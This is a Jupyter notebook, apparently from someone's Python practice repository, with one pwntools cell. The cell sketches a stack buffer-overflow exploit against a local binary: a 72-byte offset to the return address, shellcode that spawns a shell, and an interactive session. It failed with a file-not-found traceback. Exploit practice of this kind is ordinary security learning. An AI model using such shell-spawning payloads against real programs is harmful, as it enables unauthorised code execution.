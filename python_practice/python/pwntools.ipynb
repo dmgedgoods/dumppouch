{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "ename": "FileNotFoundError",
     "evalue": "[Errno 2] No such file or directory: '~/code/python/a.exe'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mFileNotFoundError\u001b[0m                         Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[26], line 4\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;21;01mpwn\u001b[39;00m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;241m*\u001b[39m\n\u001b[1;32m----> 4\u001b[0m \u001b[43mcontext\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mbinary\u001b[49m \u001b[38;5;241m=\u001b[39m \u001b[38;5;124m'\u001b[39m\u001b[38;5;124m~/code/python/a.exe\u001b[39m\u001b[38;5;124m'\u001b[39m\n\u001b[0;32m      6\u001b[0m p \u001b[38;5;241m=\u001b[39m process(\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m./a.exe\u001b[39m\u001b[38;5;124m'\u001b[39m)\n\u001b[0;32m      7\u001b[0m offset \u001b[38;5;241m=\u001b[39m \u001b[38;5;241m72\u001b[39m  \u001b[38;5;66;03m# Offset to overwrite return address\u001b[39;00m\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python312\\site-packages\\pwnlib\\context\\__init__.py:176\u001b[0m, in \u001b[0;36m_validator.<locals>.fset\u001b[1;34m(self, val)\u001b[0m\n\u001b[0;32m    175\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mfset\u001b[39m(\u001b[38;5;28mself\u001b[39m, val):\n\u001b[1;32m--> 176\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_tls[name] \u001b[38;5;241m=\u001b[39m \u001b[43mvalidator\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mval\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python312\\site-packages\\pwnlib\\context\\__init__.py:873\u001b[0m, in \u001b[0;36mContextType.binary\u001b[1;34m(self, binary)\u001b[0m\n\u001b[0;32m    870\u001b[0m \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;21;01mpwnlib\u001b[39;00m\u001b[38;5;21;01m.\u001b[39;00m\u001b[38;5;21;01melf\u001b[39;00m     \u001b[38;5;28;01mimport\u001b[39;00m ELF\n\u001b[0;32m    872\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(binary, ELF):\n\u001b[1;32m--> 873\u001b[0m     binary \u001b[38;5;241m=\u001b[39m \u001b[43mELF\u001b[49m\u001b[43m(\u001b[49m\u001b[43mbinary\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m    875\u001b[0m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39march   \u001b[38;5;241m=\u001b[39m binary\u001b[38;5;241m.\u001b[39march\n\u001b[0;32m    876\u001b[0m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mbits   \u001b[38;5;241m=\u001b[39m binary\u001b[38;5;241m.\u001b[39mbits\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python312\\site-packages\\pwnlib\\elf\\elf.py:219\u001b[0m, in \u001b[0;36mELF.__init__\u001b[1;34m(self, path, checksec)\u001b[0m\n\u001b[0;32m    213\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21m__init__\u001b[39m(\u001b[38;5;28mself\u001b[39m, path, checksec\u001b[38;5;241m=\u001b[39m\u001b[38;5;28;01mTrue\u001b[39;00m):\n\u001b[0;32m    214\u001b[0m     \u001b[38;5;66;03m# elftools uses the backing file for all reads and writes\u001b[39;00m\n\u001b[0;32m    215\u001b[0m     \u001b[38;5;66;03m# in order to permit writing without being able to write to disk,\u001b[39;00m\n\u001b[0;32m    216\u001b[0m     \u001b[38;5;66;03m# mmap() the file.\u001b[39;00m\n\u001b[0;32m    217\u001b[0m \n\u001b[0;32m    218\u001b[0m     \u001b[38;5;66;03m#: :class:`file`: Open handle to the ELF file on disk\u001b[39;00m\n\u001b[1;32m--> 219\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mfile \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;43mopen\u001b[39;49m\u001b[43m(\u001b[49m\u001b[43mpath\u001b[49m\u001b[43m,\u001b[49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[38;5;124;43mrb\u001b[39;49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[43m)\u001b[49m\n\u001b[0;32m    221\u001b[0m     \u001b[38;5;66;03m#: :class:`mmap.mmap`: Memory-mapped copy of the ELF file on disk\u001b[39;00m\n\u001b[0;32m    222\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mmmap \u001b[38;5;241m=\u001b[39m mmap\u001b[38;5;241m.\u001b[39mmmap(\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mfile\u001b[38;5;241m.\u001b[39mfileno(), \u001b[38;5;241m0\u001b[39m, access\u001b[38;5;241m=\u001b[39mmmap\u001b[38;5;241m.\u001b[39mACCESS_COPY)\n",
      "\u001b[1;31mFileNotFoundError\u001b[0m: [Errno 2] No such file or directory: '~/code/python/a.exe'"
     ]
    }
   ],
   "source": [
    "from pwn import *\n",
    "\n",
    "\n",
    "context.binary = '~/code/python/a.exe'\n",
    "\n",
    "p = process('./a.exe')\n",
    "offset = 72  # Offset to overwrite return address\n",
    "\n",
    "# Example shellcode to spawn a shell\n",
    "shellcode = asm(shellcraft.sh())\n",
    "\n",
    "# Create the payload\n",
    "payload = flat({\n",
    "    offset: shellcode\n",
    "})\n",
    "\n",
    "p.sendline(payload)\n",
    "p.interactive()\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
